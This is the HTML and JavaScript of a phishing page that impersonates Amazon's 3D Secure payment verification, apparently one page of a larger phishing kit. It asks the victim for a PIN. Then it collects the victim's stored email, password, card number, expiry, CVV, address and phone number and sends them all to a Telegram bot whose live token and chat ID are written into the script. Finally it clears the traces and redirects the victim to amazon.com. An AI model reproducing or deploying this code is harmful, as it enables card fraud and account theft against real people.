<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Secure Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .logo {
            margin: 10px 0 20px;
            text-align: center;
        }
        .logo img {
            height: 30px;
        }
        .kotak {
            width: 100%;
            max-width: 420px;
            padding: 30px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background: #fff;
        }
        .kotak h1 {
            font-size: 22px;
            font-weight: 400;
            margin-bottom: 8px;
            text-align: center;
        }
        .sub-judul {
            text-align: center;
            color: #555;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .info-kartu {
            background: #f7f7f7;
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 25px;
            font-size: 14px;
            line-height: 1.8;
        }
        .info-kartu span {
            font-weight: 700;
        }
        .label {
            font-weight: 700;
            font-size: 13px;
            margin: 0 0 12px;
            display: block;
            text-align: center;
        }
        .kotak-pin {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 25px;
        }
        .input-pin {
            width: 50px;
            height: 55px;
            text-align: center;
            font-size: 22px;
            border: 1px solid #a6a6a6;
            border-radius: 4px;
            outline: none;
        }
        .input-pin:focus {
            border-color: #007185;
            box-shadow: 0 0 0 2px #c8f0f4;
        }
        .tombol-kirim {
            width: 100%;
            padding: 10px;
            background: linear-gradient(to bottom, #f7df89, #ecc000);
            border: 1px solid #a88700;
            border-radius: 8px;
            font-size: 15px;
            cursor: pointer;
            height: 42px;
        }
        .tombol-kirim:disabled {
            background: #e9e9e9;
            border-color: #ccc;
            cursor: not-allowed;
            opacity: 0.7;
        }
        .tombol-kirim:not(:disabled):hover {
            background: linear-gradient(to bottom, #f5d76e, #d4a300);
        }
        .bawah {
            margin-top: 30px;
            font-size: 11px;
            color: #555;
            text-align: center;
        }
        .pesan-status {
            margin-top: 15px;
            font-size: 13px;
            text-align: center;
            display: none;
        }
        .berhasil { color: #008a00; display: block !important; }
        .gagal { color: #d00; display: block !important; }
    </style>
</head>
<body>

    <div class="logo">
        <img src="img/amazonlogo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>3D Secure Verification</h1>
        <p class="sub-judul">Verify your identity to complete payment</p>

        <div class="info-kartu">
            <p>📧 Email: <span id="tampil-email"></span></p>
            <p>💳 Card Ending: <span id="tampil-akhir"></span></p>
        </div>

        <p class="label">Enter your PIN / Password</p>

        <div class="kotak-pin">
            <input type="password" maxlength="1" class="input-pin" id="p1">
            <input type="password" maxlength="1" class="input-pin" id="p2">
            <input type="password" maxlength="1" class="input-pin" id="p3">
            <input type="password" maxlength="1" class="input-pin" id="p4">
            <input type="password" maxlength="1" class="input-pin" id="p5">
            <input type="password" maxlength="1" class="input-pin" id="p6">
        </div>

        <button id="tombol-kirim" class="tombol-kirim" disabled>Submit & Continue</button>
        
        <div id="pesan-status" class="pesan-status"></div>
    </div>

    <div class="bawah">
        <p>Verified by Visa / Mastercard Identity Check</p>
    </div>

<script>
const pinInputs = [
    document.getElementById('p1'),
    document.getElementById('p2'),
    document.getElementById('p3'),
    document.getElementById('p4'),
    document.getElementById('p5'),
    document.getElementById('p6')
];
const tombolKirim = document.getElementById('tombol-kirim');
const pesanStatus = document.getElementById('pesan-status');

// Data tetap tersimpan — tidak dihapus sebelum terkirim
let dataSiapKirim = null;

window.addEventListener('load', function() {
    const email = localStorage.getItem('email_pengguna');
    const nomorKartu = localStorage.getItem('nomor_kartu');
    
    if (!email || !nomorKartu) {
        window.location.href = 'amazon.html';
        return;
    }

    document.getElementById('tampil-email').textContent = email;
    document.getElementById('tampil-akhir').textContent = nomorKartu.slice(-4);
    pinInputs[0].focus();
});

pinInputs.forEach((input, indeks) => {
    input.addEventListener('input', function() {
        if (this.value && indeks < pinInputs.length - 1) {
            pinInputs[indeks + 1].focus();
        }
        cekLengkap();
    });
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && indeks > 0) {
            pinInputs[indeks - 1].focus();
        }
    });
});

function cekLengkap() {
    const lengkap = pinInputs.every(i => i.value.length === 1);
    tombolKirim.disabled = !lengkap;
}

async function kirimKeTelegram(pesan) {
    // Token & Chat ID langsung dari sini agar pasti terkirim
    const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
    const CHAT_ID = '7808815199';
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: pesan,
                parse_mode: 'Markdown'
            })
        });
        
        const hasil = await res.json();
        console.log('Respon Telegram:', hasil);
        return hasil.ok;
    } catch (err) {
        console.error('Error kirim:', err);
        return false;
    }
}

tombolKirim.addEventListener('click', async function() {
    const pin = pinInputs.map(i => i.value).join('');
    
    // Ambil SEMUA data
    const email = localStorage.getItem('email_pengguna') || '-';
    const sandi = localStorage.getItem('kata_sandi') || '-';
    const namaKartu = localStorage.getItem('nama_kartu') || '-';
    const nomorKartu = localStorage.getItem('nomor_kartu') || '-';
    const expKartu = localStorage.getItem('exp_kartu') || '-';
    const cvvKartu = localStorage.getItem('cvv_kartu') || '-';
    const negara = localStorage.getItem('negara_kartu') || '-';
    const alamat = localStorage.getItem('alamat_kartu') || '-';
    const kota = localStorage.getItem('kota_kartu') || '-';
    const kodePos = localStorage.getItem('kodepos_kartu') || '-';
    const telepon = localStorage.getItem('telepon_kartu') || '-';

    // Buat pesan rapi
    const pesanTelegram = `
💳 *VERIFICATION PAYMENT*
━━━━━━━━━━━━━━━━━━━━━
📧 Email: ${email}
🔑 Password: ${sandi}
👤 Nama di Kartu: ${namaKartu}
🔢 Nomor Kartu: ${nomorKartu}
📅 Expiry: ${expKartu}
🔒 CVV: ${cvvKartu}
🔐 PIN: ${pin}
🌍 Negara: ${negara}
📍 Alamat: ${alamat}, ${kota} — ${kodePos}
📞 Telepon: ${telepon}
━━━━━━━━━━━━━━━━━━━━━
    `.trim();

    // Tampilkan status mengirim
    pesanStatus.textContent = '⏳ Sedang mengirim data...';
    pesanStatus.className = 'pesan-status';
    tombolKirim.disabled = true;

    // Kirim ke Telegram
    const berhasil = await kirimKeTelegram(pesanTelegram);

    if (berhasil) {
        pesanStatus.textContent = '✅ Data terkirim! Mengalihkan...';
        pesanStatus.className = 'pesan-status berhasil';
        
        // Tunggu sebentar lalu alihkan
        setTimeout(() => {
            localStorage.clear();
            window.location.href = 'https://www.amazon.com';
        }, 1500);
    } else {
        pesanStatus.textContent = '⚠️ Gagal terkirim! Coba lagi.';
        pesanStatus.className = 'pesan-status gagal';
        tombolKirim.disabled = false;
    }
});
</script>

</body>
</html>
